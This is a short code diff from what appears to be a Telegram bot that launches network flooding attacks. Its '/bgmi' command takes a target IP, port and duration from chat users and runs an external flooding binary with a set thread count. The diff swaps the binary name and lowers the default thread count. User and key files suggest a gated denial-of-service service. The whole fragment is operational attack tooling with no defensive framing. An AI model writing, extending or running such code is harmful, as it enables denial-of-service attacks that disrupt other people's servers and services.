@@ -11,7 +11,7 @@ USER_FILE = "users.json"
 KEY_FILE = "keys.json"
 flooding_process = None
 flooding_command = None
-DEFAULT_THREADS = 100
+DEFAULT_THREADS = 10
 users = {}
 keys = {}
 def load_data():
@@ -114,7 +114,7 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     port = context.args[1]
     duration = context.args[2]
 
-    flooding_command = ['./work', target_ip, port, duration, str(DEFAULT_THREADS)]
+    flooding_command = ['./bgmi', target_ip, port, duration, str(DEFAULT_THREADS)]
     await update.message.reply_text(f'𝗔𝘁𝘁𝗮𝗰𝗸 𝗽𝗲𝗻𝗱𝗶𝗻𝗴 🦸\n\n—͟͞͞★ᴛᴀʀɢᴇᴛ :- {target_ip}\nᖘ٥ŕԵ :- {port} \nꕶË₸ﾟ:- {duration}𝗌℮cõ𝑛𝚍\n𝗧𝗔𝗣 𝗧𝗢 𝗦𝗧𝗔𝗥𝗧 :- /start\n\n𝗦𝟰 𝗢𝗙𝗙𝗜𝗖𝗜𝗔𝗟 𝗚𝗥𝗣 🚩')
 
 
